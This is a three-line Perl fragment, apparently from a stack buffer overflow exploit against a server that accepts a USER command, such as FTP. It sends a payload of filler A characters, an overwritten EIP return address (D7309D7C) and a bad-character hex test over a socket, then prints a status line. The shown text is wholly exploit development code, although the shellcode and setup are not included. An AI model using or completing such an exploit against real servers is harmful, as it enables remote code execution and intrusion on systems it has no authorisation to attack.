...
# E.g., USER AAAA($COUNT)AAAA|EIP(D7309D7C)|HEX CHAR TEST(x00x01..x09x0Ax0Bx0Cx0D..xFF
print $socket $string;
print "===> [Sending USER AAAA($COUNT)AAAA|EIP(D7309D7C)|HEX CHAR TEST(x00x01..x09x0Ax0Bx0Cx0D..xFF)]\n";
